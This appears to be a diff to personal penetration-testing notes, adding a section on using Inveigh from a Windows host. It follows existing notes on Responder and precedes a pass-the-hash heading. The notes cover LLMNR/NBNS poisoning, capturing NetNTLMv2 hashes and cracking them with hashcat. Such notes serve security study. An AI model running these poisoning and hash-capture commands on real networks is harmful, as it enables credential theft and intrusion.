@@ -173,6 +173,18 @@ The goal is get the victim to communicate with our system and capture the NetNTL
 	- `-f` attempts to fingerprint the remote host operating system and version
 - Crack NTLMv2 hash with `hashcat -m 5600`
 - logs are stored in `/usr/share/responder/logs`
+
+### Using Inveigh (from a Windows host)
+
+- https://github.com/Kevin-Robertson/Inveigh
+- `Import-Module \.Inveigh.ps1`
+	- `(Get-Command Invoke-Inveigh).Parameters` view options
+- LLMNR and NBNS Poisoning: `Invoke-Inveigh Y -NBNS Y -ConsoleOutput Y -FileOutput Y`
+- `Inveigh.exe` is the C# tool that is still being updated
+	- run the program, and then press `ESC` to enter the interactive console
+	- `GET NTLMV2UNIQUE`
+	- `GET NTLMV2USERNAMES`
+
 # Pass the Hash
 Some of these techniques are very useful for pivoting within a network. Pay close attention to the IP address and domain you are using (and which device the hashes are for )
 
